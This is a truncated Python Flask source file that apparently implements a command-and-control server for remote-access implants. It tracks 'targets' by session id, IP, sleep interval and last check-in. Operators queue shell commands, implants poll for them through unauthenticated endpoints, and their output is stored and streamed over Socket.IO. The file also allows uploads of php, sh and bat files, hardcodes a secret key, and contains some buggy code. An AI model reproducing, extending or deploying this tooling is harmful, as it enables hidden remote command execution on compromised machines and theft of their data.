import sys
from flask import Flask,request,abort, send_from_directory,session,jsonify,redirect,render_template,url_for
from datetime import datetime
from pony import orm
import json
from time import sleep
import Utility
from flask_cors import CORS
import os
from werkzeug.utils import secure_filename
from Utility import Attribute as attribute
from Utility import ActionType as action
from Utility import _state as state
from flask_socketio import SocketIO

host=''
port=0

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="http://localhost:5173")



# Create a database instance (replace 'your_database_name' with your actual database name)
db = orm.Database("sqlite", "server.db")

# Define the Targ entity using Pony ORM
class Target(db.Entity):
    _id = orm.PrimaryKey(int, auto=True)
    _st = orm.Required(int, auto=True)
    _dmp = orm.Optional(str)
    _ip = orm.Optional(str)
    _in = orm.Optional(str)
    _out = orm.Optional(str)
    _lp = orm.Optional(str)
    _isid = orm.Required(str)
    _zzz = orm.Required(int)
    _n = orm.Optional(str)

    def assign_value(self, field, value):
        if field == '_id':
                self._id = value  
        elif field == '_st':
                    self._st = value  
        elif field == '_dmp':
                    self._dmp = value  
        elif field == '_ip':
                    self._ip = value  
        elif field == '_in':
                    self._in = value  
        elif field == '_out':
                    self._out = value  
        elif field == '_lp':
                    self._lp = value  
        elif field == '_isid':
                    self._isid = value  
        elif field == '_zzz':
                    self._zzz = value  
        elif field == '_n':
                    self._n = value  
        else:
            return(f"Invalid field: {field}")

class Instance(db.Entity):
    _id = orm.PrimaryKey(int, auto=True)
    _instance_id = orm.Optional(str,unique=True)
    _instance_name = orm.Optional(str)
    _instance_ip = orm.Optional(str)
    _instance_url = orm.Optional(str)
    _Instance_count = orm.Optional(int)
    _core_id = orm.Optional(str)



db.generate_mapping(create_tables=True)
app.secret_key = 'your_secret_key'
secrets = 'ziggy'

IMAGE_FOLDER = './upl/ph/'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif','txt','js','sh','bat','php',''}
app.config['IMAGE_FOLDER'] = IMAGE_FOLDER

""" INSTANCE MANAGER OPERATIONS """ 
#Instance Manager
@app.route('/<_core_id>/i/<field>/<value>', methods=['GET'])
@orm.db_session
def getinstancebyfield(_core_id,field, value):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"getinstancebyfield(_core_id,field, value):: 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve records based on the specified field and its value from the Target entity
            records = Instance.select(lambda t: getattr(t, field) == value)[:]
            # Check if any records match the criteria
            if records:
                # Convert the records to a list of dictionaries and return it as JSON response
                records_data = [{
                "_instance_id": records._instance_id,
                "_instance_name": records._instance_name,
                "_instance_ip": records._instance_ip,
                "_instance_url": records._instance_url,
                "_Instance_count": records._Instance_count,
                "_core_id": records._core_id
                } for record in records]

                
                Utility.Log.insert_log(f"{_core_id}",
                               f'fetching {len(records)} records field: {field} value: {value}',
                               action.GET.value,
                               str(datetime.now()),
                               action.SUCCESS.value,
                               "{\"msg\":\"getinstancebyfield(_core_id,field, value):"+"\"}")
                return jsonify(records_data)  # Return the records as JSON response
            else:

                
                Utility.Log.insert_log(f"{_core_id}",
                               'None',
                               action.GET.value,
                               str(datetime.now()),
                               action.FAILED.value,
                               "{\"msg\":\"getinstancebyfield(_core_id,field, value):"+"\"}")
                return '404', 404  # Return '404' if no records match the criteria
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                               f'None  {field} value: {value}',
                               action.GET.value,
                               str(datetime.now()),
                               action.ERROR.value,
                               "{\"msg\":\"getinstancebyfield(_core_id,field, value): "+f"Error: {e}"+"\"}")
        return '500', 500  # Return '500' in case of any error during retrieval
        
@app.route('/<_core_id>/i', methods=['POST'])
@orm.db_session  # Use db_session decorator to manage database sessions
def insertinstance(_core_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"def insertinstance(_core_id): 401"+"\"}")
        return '401', 401
    try:
        data = request.get_json()  # Get JSON data from the request body

        # Extract data from JSON
        instance_id = Utility.generate_random_string(10)
        instance_name = data.get('_instance_name')
        instance_ip = data.get('_instance_ip')
        instance_url = data.get('_instance_url')
        instance_count = data.get('_Instance_count')
        core_id = data.get('_core_id')
        # Create a new Instance object and insert it into the database
        Instance(_instance_id=instance_id,
                                _instance_name=instance_name,
                                _instance_ip=instance_ip,
                                _instance_url=instance_url,
                                _Instance_count=instance_count,
                                _core_id=core_id)
        db.commit()  # Commit the transactionType to save the record in the database
        
        Utility.Log.insert_log(f"{_core_id}",
                               instance_name,
                               action.INSERT.value,
                               str(datetime.now()),
                               action.SUCCESS.value,
                               "{\"msg\":\"insertinstance(_core_id): 201"+"\"}")
        return 'Record inserted successfully', 201  # Return success message and status code 201 (Created)
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                               'None',
                               action.INSERT.value,
                               str(datetime.now()),
                               action.FAILED.value,
                               "{\"msg\":\"insertinstance(_core_id): 400"+"\"}")
        return str(e), 400  # Return error message and status code 400 (Bad Request) in case of errors

@app.route('/<_core_id>/i/<int:record_id>', methods=['GET'])
@orm.db_session
def getinstancebyid(_core_id,record_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"getinstancebyid(_core_id,record_id): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            #print(record_id)
            # Retrieve the record by ID from the Target entity
            target_record = Instance.select(lambda s: s._id == record_id and s._core_id == _core_id).first()
            
            if target_record:
                # Convert the record to a dictionary and return it as JSON response
                target = {
                "_instance_id": target_record._instance_id,
                "_instance_name": target_record._instance_name,
                "_instance_ip": target_record._instance_ip,
                "_instance_url": target_record._instance_url,
                "_Instance_count": target_record._Instance_count,
                "_core_id": target_record._core_id
                } 
                retObj = jsonify(target)
               
                
                Utility.Log.insert_log(_core_id,
                               target_record._instance_name,
                               action.GET.value,
                               str(datetime.now()),
                               action.SUCCESS.value,
                               "{\"msg\":\"getinstancebyid(_core_id,record_id): 200\"}")
                return retObj # Return the record as JSON response
            else:

                
                Utility.Log.insert_log(f"{_core_id}",
                               'None',
                               action.GET.value,
                               str(datetime.now()),
                               action.FAILED.value,
                               "{\"msg\":\"getinstancebyid(_core_id,record_id): 404"+"\"}")
                return '404', 404  # Return '404' if the record with the specified ID does not exist
    except Exception as e:
        #print(coi+'*********************************************')
        
        Utility.Log.insert_log(f'{_core_id}',
                        'None',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"getinstancebyid(_core_id,record_id): 500 Error \"}"+f'{e}')
        return '500', 500  # Return '500' in case of any error during retrieval

@app.route('/<_core_id>/i/all', methods=['GET'])
@orm.db_session
def getallinstance(_core_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :


        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"getallinstance(_core_id): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve all records from the Target entity
            records = Instance.select(lambda s: s._core_id == _core_id)
            # Convert the records to a list of dictionaries and return it as JSON response
            record_data = [{
            "_instance_id": record._instance_id,
            "_instance_name": record._instance_name,
            "_instance_ip": record._instance_ip,
            "_instance_url": record._instance_url,
            "_Instance_count": record._Instance_count,
            "_core_id": record._core_id
            } for record in records]
            
            Utility.Log.insert_log(f"{_core_id}",
                               f'fetching {len(records)} records',
                               action.GET.value,
                               str(datetime.now()),
                               action.SUCCESS.value,
                               "{\"msg\":\"getallinstance(_core_id): 200"+"\"}")
            return jsonify(record_data)  # Return the records as JSON response
    
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                               'None',
                               action.GET.value,
                               str(datetime.now()),
                               action.ERROR.value,
                               "{\"msg\":\"getallinstance(_core_id): 500 "+f"Error: {e}"+"\"}")
        return 500  # Return '500' in case of any error during retrieval

@app.route('/<_core_id>/i/<int:record_id>', methods=['DELETE'])
@orm.db_session
def deleteinstancebyid(_core_id,record_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"deleteinstancebyid(_core_id,record_id): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve the record by ID
            instance = Instance.get(_id=record_id)
            # Check if the record exists
            if instance:
                # Delete the record from the database
                instance.delete()
                orm.commit()
                
                Utility.Log.insert_log(f"{_core_id}",
                               f'Deleted {record_id}',
                               action.DELETE.value,
                               str(datetime.now()),
                               action.SUCCESS.value,
                               "{\"msg\":\"deleteinstancebyid(_core_id,record_id): 200"+"\"}")
                return '200'  # Return '200' to indicate successful deletion
            else:
                
                Utility.Log.insert_log(f"{_core_id}",
                               'None',
                               action.DELETE.value,
                               str(datetime.now()),
                               action.FAILED.value,
                               "{\"msg\":\"deleteinstancebyid(_core_id,record_id): 404"+"\"}")
                return '404'  # Return '404' if the record with the specified ID does not exist
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                               'None',
                               action.DELETE.value,
                               str(datetime.now()),
                               action.ERROR.value,
                               "{\"msg\":\"deleteinstancebyid(_core_id,record_id): 500" + f"Error: {e}"+"\"}")
        return '500'  # Return '500' in case of any error during deletion

@app.route('/<_core_id>/i/<id>/<field>/<value>')
@orm.db_session
# Function to update a specific field in a record by ID
def updatesingleInstancebyid(_core_id,id, field, value):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"updatesingleInstancebyid(_core_id,id, field, value): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve the record by ID directly from the Targ entity
            instance = Instance.get(_id=id)
            print(f"id: {id} field: {field} value:{value}")
            # Check if the record exists
            if instance:
                # Update the specified field with the new value
                setattr(instance, field, value)
                orm.commit()
                
                Utility.Log.insert_log(f"{_core_id}",
                                f'updated single field:{field} value:{value}',
                                action.UPDATE.value,
                                str(datetime.now()),
                                action.SUCCESS.value,
                                "{\"msg\":\"updatesingleInstancebyid(_core_id,id, field, value): 200"+"\"}")
                return '200'  # Return True to indicate successful update
            else:
                
                Utility.Log.insert_log(f"{_core_id}",
                                'None',
                                action.UPDATE.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"updatesingleInstancebyid(_core_id,id, field, value): 404"+"\"}")
                return '404'  # Return False if the record with the specified ID does not exist
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                                'None',
                                action.UPDATE.value,
                                str(datetime.now()),
                                action.ERROR.value,
                                "{\"msg\":\"updatesingleInstancebyid(_core_id,id, field, value): 500 "+f"Error: {e}"+"\"}")
        return '500'  # Return '500' in case of any error during deletion

#@Client updatemanyinstancebyfield():
@app.route('/<_core_id>/i/<field>/<value>/<new_value>', methods=['PUT'])
@orm.db_session
def updatemanyinstancebyfield(_core_id,field,value,new_value):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\" updatemanyinstancebyfield(_core_id,field,value,new_value): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve records based on the specified field and its current value
            instances = Instance.select(lambda t: getattr(t, field) == value)[:]
            # Check if any records match the criteria
            if Instance:
                # Update the specified field with the new value for all matching records
                for index, record in enumerate(instances):
                    print("Iteration:", index + 1)  # Add 1 because index is zero-based
                    setattr(record, field, new_value)
                orm.commit()
                
                Utility.Log.insert_log(f"{_core_id}",
                                f' field:{field}, value:{value} ,new value:{new_value}',
                                action.UPDATE.value,
                                str(datetime.now()),
                                action.SUCCESS.value,
                                "{\"msg\":\" updatemanyinstancebyfield(_core_id,field,value,new_value): 200 "+"\"}")
                return '200'  # Return '200' to indicate successful update
            
            else:
                
                Utility.Log.insert_log(f"{_core_id}",
                                    None,
                                    action.UPDATE.value,
                                    str(datetime.now()),
                                    action.FAILED.value,
                                    "{\"msg\":\" updatemanyinstancebyfield(_core_id,field,value,new_value): 404 "+"\"}")
                return '404'  # Return '404' if no records match the criteria
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                    None,
                    action.UPDATE.value,
                    str(datetime.now()),
                    action.ERROR.value,
                    "{\"msg\":\" updatemanyinstancebyfield(_core_id,field,value,new_value):"+f"Error: {e}"+"\"}")
        print(f"Error: {e}")
        return '500'  
    # Return '500' in case of any error during the update

""" TARGET MANAGER OPERATIONS """

#Target Manager
@app.route('/<_core_id>/t', methods=['POST'])
@orm.db_session
def insertrecord(_core_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertrecord(_core_id): 401"+"\"}")
        return '401', 401
    try:
        data = request.get_json()  # Assuming the client sends JSON data in the request body
        with orm.db_session:
            # Create a new Target entity using the provided JSON data
            new_record = Target(_st=data.get('_st'),
                              _dmp=data.get('_dmp'),
                              _ip=data.get('_ip'),
                              _in=data.get('_in'),
                              _out=data.get('_out'),
                              _lp=data.get('_lp'),
                              _zzz=data.get('_zzz'),
                              _n=data.get('_n'),
                              _isid=data.get('_isid'))
            print(new_record)
            # Commit the new record to the database
            orm.commit()
            
            Utility.Log.insert_log(f"{_core_id}",
                        f'{data.get("_n")} inserted success',
                        action.INSERT.value,
                        str(datetime.now()),
                        action.SUCCESS.value,
                        "{\"msg\":\"insertrecord(_core_id): 200"+"\"}")
        return '200'  # Return '200' to indicate successful insertion
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                    f' failed to insert {data.get("_n")} ',
                    action.INSERT.value,
                    str(datetime.now()),
                    action.ERROR.value,
                    "{\"msg\":\"insertrecord(_core_id): 500 "+f"Error: {e}"+"\"}")
        return '500'  # Return '500' in case of any error during insertion

@app.route('/<_core_id>/t/<field>/<value>', methods=['GET'])
@orm.db_session
def getrecordsbyfield(_core_id,field, value):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"getrecordsbyfield(_core_id,field, value): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve records based on the specified field and its value from the Target entity
            records = Target.select(lambda t: getattr(t, field) == value)[:]
            # Check if any records match the criteria
            if records:
                # Convert the records to a list of dictionaries and return it as JSON response
                records_data = [{
                    '_st': record._st,
                    '_id': record._id,
                    '_dmp': record._dmp,
                    '_ip': record._ip,
                    '_in': record._in,
                    '_out': record._out,
                    '_lp': record._lp,
                    '_n': record._n,
                    '_zzz': record._zzz,
                    '_isid': record._isid,
                } for record in records]
                
                Utility.Log.insert_log(f"{_core_id}",
                    f'count: {len(records)}',
                    action.GET.value,
                    str(datetime.now()),
                    action.SUCCESS.value,
                    "{\"msg\":\"getrecordsbyfield(_core_id,field, value): 200"+"\"}")
                return jsonify(records_data)  # Return the records as JSON response
            else:
                
                Utility.Log.insert_log(f"{_core_id}",
                    f'count: {len(records)}',
                    action.GET.value,
                    str(datetime.now()),
                    action.FAILED.value,
                    "{\"msg\":\"getrecordsbyfield(_core_id,field, value): 404"+"\"}")
                return '404', 404  # Return '404' if no records match the criteria
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                f'count: {len(records)}',
                action.GET.value,
                str(datetime.now()),             
                action.ERROR.value,
                "{\"msg\":\"getrecordsbyfield(_core_id,field, value): 500 "+f"Error: {e}"+"\"}")
        return '500', 500  # Return '500' in case of any error during retrieval

@app.route('/<_core_id>/s',methods=['POST'])
@orm.db_session
def SyncCore(_core_id):
    #->
    Utility.Log.insert_log(f"{_core_id}",
                f'Syncing Core',
                action.GET.value,
                str(datetime.now()),             
                action.ERROR.value,
                "{\"msg\":\"SyncCore(_core_id) - Syncing Core \"}")
    return Utility.sync_core(request.data)



#NEW-CLI
@app.route('/<_core_id>/<_isid>/c',methods=['POST'])
@orm.db_session
def command(_core_id,_isid):
    try:
        print(request.get_json())
        if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
                #print(f'*******************{Utility.Sessions.session_valid(request.headers.get("authtok"))}***************',request.headers.get('authtok'))
                Utility.Log.insert_log(f"{_core_id}",
                                        f'{_isid}',
                                        action.EXEC.value,
                                        str(datetime.now()),
                                        action.FAILED.value,
                                        "{\"msg\":\"command(): 401"+"\"}")
                return '401', 401
        target = request.get_json()
        if target:
            if target['_isid'] == _isid :
                command = target['_in'] 
                id = target['_id'] 
                targ = orm.select(i for i in Target if i._id == target['_id']).first()
                targ._ip = target['_ip'] 
                targ._st = target['_st'] 
                targ._dmp = target['_dmp'] 
                targ._in = target['_in'] 
                targ._out = target['_out'] 
                targ._lp = target['_lp'] 
                targ._isid = target['_isid'] 
                targ._zzz = target['_zzz'] 
                targ._n = target['_n']
                orm.commit()

                
                Utility.Log.insert_log(f"{_core_id}",
                            f'{_isid}',
                            action.EXEC.value,
                            str(datetime.now()),
                            action.SUCCESS.value,
                            "{\"msg\":\"command(): 200"+"\"}")
                socketio.emit(f's/{_isid}',f' { id } running: { command }')
                return '200', 200
        return '403', 403
    except Exception as e:
            
            Utility.Log.insert_log(f"{_core_id}",
                            f'{_isid}',
                            action.EXEC.value,
                            str(datetime.now()),
                            action.FAILED.value,
                            "{\"msg\":\"command(): 500"+f"{e}"+"\"}")
            return '500', 500

# Function to check for changes in the database
@orm.db_session
def poll_database_for_value(targ):
    while True:
        with orm.db_session:
            # Replace 'value' with the actual attribute you're monitoring
            #result = orm.select(c for c in Target if c._out != '.' and c._id == targ._id and c._isid == targ._isid).first()
            # result = orm.select(c for c in Target if  c._id == targ._id and c._isid == targ._isid).first()

            # if result:
            #     out = {'value': result._out}
            #     # If a value is found, emit a SocketIO event to the connected clients
            #     socketio.emit('isid',f'{out}' )
            #     break

            # Add a delay to avoid excessive database queries
            socketio.sleep(5)  # You can adjust the polling interval as needed


# Convert targ to JSON
def convert_to_dict(obj):
    if isinstance(obj, orm.core.Entity):
        return obj.to_dict()



#ICCI
@socketio.on('isid')
@orm.db_session
def handle_message(msg):
    #print('Received message: **************************' + msg)
    obj = json.loads(msg)
    with orm.db_session:
        targ = orm.select(c for c in Target if c._isid == obj['_isid'] and c._id == obj['_id']).first()
        if targ :
            targ._st = Utility._state.COMMAND.value
            targ._in = obj['_msg']
            orm.commit()

@app.route('/<isid>/<id>/gc',methods=["GET"])
@orm.db_session
def getcmd(isid,id):
    try:
        targets  = Target.select(lambda i : i._isid == isid and int(i._id) == int(id)).first()
        if targets is not None:
            with orm.db_session:
                command = getattr(targets,attribute.IN.value)
                #set the state back to listen
                setattr(targets,attribute.STATE.value,state.LISTEN.value)
                setattr(targets,attribute.IN.value,'')
                orm.commit()
                
                Utility.Log.insert_log(f"{isid}",
                                    f'{id}',
                                    action.GET.value,
                                    str(datetime.now()),
                                    action.SUCCESS.value,
                                    "{\"msg\":\" getcmd(isid,id) 200 \"}")
                return command
    except Exception as e :
        
        Utility.Log.insert_log(f"{isid}",
                        f'{id}',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\" getcmd(isid,id) 401 \"}"+f"\n{e}")
    return '401'


@app.route('/<isid>/<id>/so',methods=["POST"])
@orm.db_session
def setout(isid,id):
    try:
        targets  = Target.select(lambda i : i._isid == isid and int(i._id) == int(id)).first()
        if targets is not None:
            with orm.db_session:
                data = str(request.data)
                if data:
                    dump  = targets._dmp
                    targets._dmp  = dump + '\n' + data
                    targets._out = data
                    orm.commit()
                    #targets._out = str(data)
                    socketio.emit(f'{isid}',f'{str(data)}' )
                    Utility.Log.insert_log(f"{isid}",
                                    f'{id}',
                                    action.GET.value,
                                    str(datetime.now()),
                                    action.SUCCESS.value,
                                    "{\"msg\":\" setout(isid,id) 200 \"}")
                    #orm.commit()
                    return '200'
    except Exception as e :
        
        Utility.Log.insert_log(f"{isid}",
                        f'{id}',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\" setout(isid,id) 400 \"}"+f"\n{e}")
    return '404'


@app.route('/<isid>/<id>/go',methods=["GET"])
@orm.db_session
def getout(isid,id):
    try:

        out=''
        targets  = orm.select(i for i in Target if  i._isid == isid and int(i._id) == int(id)).first()
        with orm.db_session: 
            if targets is not None:
                Utility.Log.insert_log(f"{isid}",
                        f'{id}',
                        action.GET.value,
                        str(datetime.now()),
                        action.SUCCESS.value,
                        "{\"msg\":\" def getout(isid,id): 200 \"}")
                out = getattr(targets,attribute.OUT.value)
                setattr(targets,attribute.OUT.value,'')
                orm.commit()
                return out
    except Exception as e :
        Utility.Log.insert_log(f"{isid}",
                        f'{id}',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\" def getout(isid,id): 401 \"}"+f"\n{e}")
    return '401'

@app.route('/<isid>/<id>/gs',methods=["GET"])
@orm.db_session 
def getstate(isid,id):
    try:
        targets  = orm.select(i for i in Target if i._isid == isid and int(i._id) == int(id)).first()
        if targets is not None:
            targets._lp = str(datetime.now())
            orm.commit()
            if targets._st == -1 :
                    
                    setattr(targets,
                            attribute.STATE.value,
                            state.LISTEN.value)
                    orm.commit()
                    return str(targets._st)
            Utility.Log.insert_log(f"{isid}",
                        f'{id}',
                        action.GET.value,
                        str(datetime.now()),
                        action.SUCCESS.value,
                        "{\"msg\":\"getstate(): 200 \"}"+f"\n")
            
            LiveViewObj = {"isid": f"{isid}", "status": '200', "time": f"{str(datetime.now())}", "msg": f"def getstate(isid,id):({id})"}
            LiveViewObjString = json.dumps(LiveViewObj)
            socketio.emit(f's/{isid}', LiveViewObjString)

            return str(targets._st)
    except Exception as e :
        
        Utility.Log.insert_log(f"{isid}",
                        f'{id}',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"getstate(): 500 \"}"+f"\n{e}")
    return '500'

#NEW-CLI
@app.route('/<_core_id>/<isid>/gt',methods=['GET'])
@orm.db_session
def getTargets(_core_id,isid):
    try:
        with orm.db_session:
            if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
                    #print(f'*******************{Utility.Sessions.session_valid(request.headers.get("authtok"))}***************',request.headers.get('authtok'))
                    
                    Utility.Log.insert_log(f"{_core_id}",
                                            f'{isid}',
                                            action.GET.value,
                                            str(datetime.now()),
                                            action.FAILED.value,
                                            "{\"msg\":\"idef getTargets(_core_id,isid): 401"+"\"}")
                    return '401', 401
            #print(isid)
            targets  = Target.select(lambda i : i._isid == isid)
            #print(len(targets))
            if targets is None :
                
                Utility.Log.insert_log(f"{_core_id}",
                                f'{isid}',
                                action.GET.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"getTargets(): 404"+"\"}")
                
                return "404"
            records_data = [{
                    '_st': record._st,
                    '_id': record._id,
                    '_dmp': record._dmp,
                    '_ip': record._ip,
                    '_in': record._in,
                    '_out': record._out,
                    '_lp': record._lp,
                    '_n': record._n,
                    '_zzz': record._zzz,
                    '_isid': record._isid,
                } for record in targets]

            Utility.Log.insert_log(f"{_core_id}",
                                f'{isid}',
                                action.GET.value,
                                str(datetime.now()),
                                action.SUCCESS.value,
                                "{\"msg\":\"getTargets(): 200"+"\"}")
                
            return jsonify(records_data)
    except Exception as e :
        
        Utility.Log.insert_log(f"{_core_id}",
                        f'{isid}',
                        action.GET.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"getTargets(): 500 \"}"+f"\n{e}")
    return "500"
    

    


@app.route('/<_core_id>/t/<int:record_id>', methods=['GET'])
@orm.db_session
def getrecordbyid(_core_id,record_id):
    #->

    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        #print(f'*******************{Utility.Sessions.session_valid(request.headers.get("authtok"))}***************',request.headers.get('authtok'))
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.SUCCESS.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertinstance(): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve the record by ID from the Target entity
            target_record = Target.get(_id=record_id)

            if target_record is not None:
                # Convert the record to a dictionary and return it as JSON response
                record_data = {
                    '_st': target_record._st,
                    '_dmp': target_record._dmp,
                    '_ip': target_record._ip,
                    '_in': target_record._in,
                    '_out': target_record._out,
                    '_lp': target_record._lp,
                    '_n': target_record._n,
                    '_zzz': target_record._zzz,
                    '_isid': target_record._isid
                }
                
                Utility.Log.insert_log(f"{_core_id}",
                    f'{target_record._n}',
                    action.GET.value,
                    str(datetime.now()),
                    action.SUCCESS.value,
                    "{\"msg\":\"getrecordbyid(record_id): 200"+"\"}")
                return jsonify(record_data)  # Return the record as JSON response
            else:
                
                Utility.Log.insert_log(f"{_core_id}",
                    f'{record_id}',
                    action.GET.value,
                    str(datetime.now()),
                    action.FAILED.value,
                    "{\"msg\":\"getrecordbyid(record_id): 404"+"\"}")
                return '404', 404  # Return '404' if the record with the specified ID does not exist

    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                    f'{record_id}',
                    action.GET.value,
                    str(datetime.now()),
                    action.ERROR.value,
                    "{\"msg\":\"getrecordbyid(record_id): 500" +f"Error: {e}"+"\"}")
        return '500', 500  # Return '500' in case of any error during retrieval

@app.route('/<_core_id>/<_isid>/t/all', methods=['GET'])
@orm.db_session
def getallrecords(_core_id,_isid):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"def getallrecords(_core_id,_isid): 401"+"\"}")
        
        LiveViewObj = {"isid": f"{_isid}", "status": '401', "time": f"{str(datetime.now())}", "msg": "invalid session"}
        LiveViewObjString = json.dumps(LiveViewObj)
        socketio.emit(f's/{_isid}', LiveViewObjString)
        return '401', 401
    try:
       
        # Retrieve all records from the Target entity
        records = orm.select(i for i in Target if i._isid == _isid )
        
        # Convert the records to a list of dictionaries and return it as JSON response
        records_data = [{
            '_st': record._st,
            '_id': record._id,
            '_dmp': record._dmp,
            '_ip': record._ip,
            '_in': record._in,
            '_out': record._out,
            '_lp': record._lp,
            '_n': record._n,
            '_zzz': record._zzz,
            '_isid': record._isid
        } for record in records]
        
        Utility.Log.insert_log(f"{_core_id}",
                f'{_isid}',
                action.GET.value,
                str(datetime.now()),
                action.SUCCESS.value,
                "{\"msg\":\"getallrecords(): 200"+"\"}")

        LiveViewObj = {"isid": f"{_isid}", "status": '200', "time": f"{str(datetime.now())}", "msg": "getalltargets()"}
        LiveViewObjString = json.dumps(LiveViewObj)
        socketio.emit(f's/{_isid}', LiveViewObjString)

        return jsonify(records_data), 200 # Return the records as JSON response

    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                    f'{_isid}',
                    action.GET.value,
                    str(datetime.now()),
                    action.ERROR.value,
                    "{\"msg\":\"getallrecords(): 500 "+f"Error: {e}"+"\"}")
        return '500', 500  # Return '500' in case of any error during retrieval



@app.route('/<_core_id>/t/<int:record_id>', methods=['DELETE'])
@orm.db_session
def deleterecordbyid(_core_id,record_id):
    #->
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_core_id}",
                                'invalid session',
                                action.DELETE.value,
                                str(datetime.now()),
                                action.FAILED.value,
                                "{\"msg\":\"insertinstance(): 401"+"\"}")
        return '401', 401
    try:
        with orm.db_session:
            # Retrieve the record by ID
            target_record = Target.get(_id=record_id)
            # Check if the record exists
            if target_record:
                # Delete the record from the database
                target_record.delete()
                orm.commit()
                
                
                Utility.Log.insert_log(f"{_core_id}",
                        f'recordid:{record_id}',
                        action.DELETE.value,
                        str(datetime.now()),
                        action.SUCCESS.value,
                        "{\"msg\":\"deleterecordbyid(record_id): 200 "+"\"}")
                return '200'  # Return '200' to indicate successful deletion
            else:    
                
                Utility.Log.insert_log(f"{_core_id}",
                        f'recordid:{record_id}',
                        action.DELETE.value,
                        str(datetime.now()),
                        action.FAILED.value,
                        "{\"msg\":\"deleterecordbyid(record_id): 404"+"\"}")
                return '404'  # Return '404' if the record with the specified ID does not exist
    except Exception as e:
        
        Utility.Log.insert_log(f"{_core_id}",
                        f'recordid:{record_id}',
                        action.DELETE.value,
                        str(datetime.now()),
                        action.ERROR.value,
                        "{\"msg\":\"deleterecordbyid(record_id): 500"+f"Error: {e}"+"\"}")
        return '500'  # Return '500' in case of any error during deletion



@app.route('/<_isid>/<_id>/<int:sleep>/<interval>/z',methods=['GET'])
@orm.db_session
# Function to update a specific field in a record by ID
def sleepAgent(_isid, _id, sleep,interval):
    #->
    print('***'*100)   
    if not Utility.Sessions.session_valid(request.headers.get('authtok')) :
        
        Utility.Log.insert_log(f"{_isid}",
                                'invalid session',
                                action.INSERT.value,
                                str(datetime.now()),
                                action.FAILED.value,
